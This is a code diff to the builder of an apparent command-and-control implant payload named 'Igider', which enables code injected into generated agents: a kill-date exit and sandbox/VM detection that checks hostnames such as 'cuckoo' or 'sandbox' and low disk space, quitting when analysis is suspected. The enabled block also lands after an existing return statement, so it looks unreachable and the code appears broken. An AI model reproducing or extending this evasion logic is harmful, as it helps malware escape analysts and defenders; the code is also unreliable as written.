@@ -14,7 +14,7 @@ import string
 import logging
 from typing import Dict, Any, List, Optional
 from itertools import cycle
-
+import datetime
 
 class Igider(PayloadType):
     name = "igider"
@@ -344,64 +344,64 @@ if not check_environment():
     
     # Combine all evasion code and prepend to the original code
         return "\n".join(evasion_code) + "\n" + code
-#         """Add anti-analysis and VM detection capabilities."""
-#         # Add kill date check if specified*******************************************
-#         try:
-#             kill_date = self.c2info[0].get_parameters_dict().get("killdate", None)
+        """Add anti-analysis and VM detection capabilities."""
+        # Add kill date check if specified*******************************************
+        try:
+            kill_date = self.c2info[0].get_parameters_dict().get("killdate", None)
 
-#         except (IndexError, AttributeError, TypeError) as e:
-#             kill_date = None
-#             self.logger.warning(f"Could not retrieve kill_date: {e}")
+        except (IndexError, AttributeError, TypeError) as e:
+            kill_date = None
+            self.logger.warning(f"Could not retrieve kill_date: {e}")
 
-#         evasion_code = ""
+        evasion_code = ""
         
-#         if kill_date and kill_date.strip():
-#             evasion_code += f"""
-# import datetime
-# if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
-#     import sys
-#     sys.exit(0)
-# """
+        if kill_date and kill_date.strip():
+            evasion_code += f"""
+import datetime
+if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
+    import sys
+    sys.exit(0)
+"""
         
-#         # Add basic sandbox/VM detection
-#         evasion_code += """
-# def check_environment():
-#     import os
-#     import socket
-#     import platform
+        # Add basic sandbox/VM detection
+        evasion_code += """
+def check_environment():
+    import os
+    import socket
+    import platform
     
-#     # Check for common analysis hostnames
-#     hostname = socket.gethostname().lower()
-#     suspicious_names = ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual']
-#     for name in suspicious_names:
-#         if name in hostname:
-#             return False
+    # Check for common analysis hostnames
+    hostname = socket.gethostname().lower()
+    suspicious_names = ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual']
+    for name in suspicious_names:
+        if name in hostname:
+            return False
     
-#     # Check for small disk size (common in VMs)
-#     try:
-#         if os.name == 'nt':
-#             import ctypes
-#             free_bytes = ctypes.c_ulonglong(0)
-#             ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
-#             if free_bytes.value < 21474836480:  # 20 GB
-#                 return False
-#         else:
-#             import shutil
-#             if shutil.disk_usage("/").free < 21474836480:  # 20 GB
-#                 return False
-#     except:
-#         pass
+    # Check for small disk size (common in VMs)
+    try:
+        if os.name == 'nt':
+            import ctypes
+            free_bytes = ctypes.c_ulonglong(0)
+            ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes))
+            if free_bytes.value < 21474836480:  # 20 GB
+                return False
+        else:
+            import shutil
+            if shutil.disk_usage("/").free < 21474836480:  # 20 GB
+                return False
+    except:
+        pass
     
-#     return True
+    return True
 
-# # Exit if suspicious environment detected
-# if not check_environment():
-#     import sys
-#     sys.exit(0)
-# """
+# Exit if suspicious environment detected
+if not check_environment():
+    import sys
+    sys.exit(0)
+"""
         
-#         # Add the evasion code at the beginning of the agent code
-#         return evasion_code + code
+        # Add the evasion code at the beginning of the agent code
+        return evasion_code + code
 
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
